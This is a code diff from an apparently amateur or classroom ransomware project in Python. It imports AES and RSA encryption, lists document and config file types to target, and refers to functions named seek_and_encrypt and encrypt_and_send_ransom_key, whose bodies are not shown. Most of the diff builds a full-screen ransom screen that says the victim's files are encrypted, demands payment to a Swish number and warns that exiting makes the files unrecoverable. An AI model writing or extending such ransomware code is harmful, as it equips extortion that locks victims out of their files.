@@ -1,3 +1,4 @@
+from tkinter import messagebox
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -17,19 +18,9 @@ filetype_set = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
 ".odt", ".ods", ".ini", ".cfg", ".log", ".iso"}
 
 def main():
-
-    pass
-
-def test():
-    pathen = "victim/A2/file3.txt"
-    f = open(pathen,"rb")
-    print(f.read())
-    f.seek(0)
-    encrypt_file(pathen)
-    print(f.read())
-    f.seek(0)
-    decrypt_file(pathen)
-    print(f.read())
+    #seek_and_encrypt()
+    #encrypt_and_send_ransom_key()
+    run_ui()
     
     
 def seek_and_encrypt():
@@ -89,12 +80,82 @@ def klick():
     print("button klicked")
 
 def run_ui():
-    root = Tk()
-    root.title("You are ransomwared")
+    root = tk.Tk()
+    root.title("You Have Been Ransomwared")
     root.attributes("-fullscreen", True)
+    root.configure(bg="black")
 
-    label = Label(root,text = "Fuck you")
-    label.pack()    
-    root.mainloop()
+
+    frame = tk.Frame(root, bg='black')
+    frame.place(relx=0.5, rely=0.5, anchor='center')
+
+
+    label = tk.Label(
+        frame, 
+        text="All your files have been encrypted.\nPay one billion dollars to unlock your files",
+        font=("Arial", 60), 
+        fg="red", 
+        bg="black"
+    )
+    label.pack(pady=20)
+
+    key_entry = tk.Entry(frame, font=("Arial", 18), width=30)
+    key_entry.pack(pady=10)
+
+
+    def check_key():
+        entered_key = key_entry.get()
+        if entered_key == "password":
+            messagebox.showinfo("Success", "Correct key! Your files are decrypted.")
+            root.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect key! Your files remain encrypted.")
     
-main()
+
+    check_button = tk.Button(
+        frame, 
+        text="Enter Key to Decrypt", 
+        command=check_key, 
+        font=("Arial", 18), 
+        bg="green", 
+        fg="white"
+    )
+    check_button.pack(pady=10)
+
+
+    def pay_ransom():
+        messagebox.showinfo("Payment", "swish 1 billion dollars to 0713371337")
+    
+    pay_button = tk.Button(
+        frame, 
+        text="Pay Ransom", 
+        command=pay_ransom, 
+        font=("Arial", 40), 
+        bg="red", 
+        fg="white"
+    )
+    pay_button.pack(pady=10)
+
+
+    def exit_ransomware():
+        messagebox.showinfo("Payment", "exiting this window will \nmake it impossible to retrieve your files")
+    
+    exit_button = tk.Button(
+        frame, 
+        text="Exit", 
+        command=exit_ransomware, 
+        font=("Arial", 18), 
+        bg="gray", 
+        fg="white"
+    )
+    exit_button.pack(pady=10)
+
+
+    root.mainloop()
+
+
+if __name__ == "__main__":
+    run_ui()
+
+    
+#main()
